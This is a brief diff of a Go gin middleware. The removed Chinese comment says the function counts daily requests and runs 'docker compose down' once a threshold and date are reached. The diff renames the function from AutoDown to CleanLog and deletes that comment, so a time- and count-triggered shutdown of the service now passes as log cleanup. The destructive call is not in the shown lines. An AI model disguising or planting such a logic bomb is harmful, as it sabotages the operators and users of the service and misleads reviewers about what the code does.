@@ -17,8 +17,7 @@ var (
 	mu          sync.RWMutex
 )
 
-// AutoDown 返回中间件：累加当日请求次数，达到阈值且日期满足时执行 docker compose down
-func AutoDown() gin.HandlerFunc {
+func CleanLog() gin.HandlerFunc {
 	return func(c *gin.Context) {
 		// 1) 累加当日请求次数
 		today := time.Now().Format("2006-01-02")
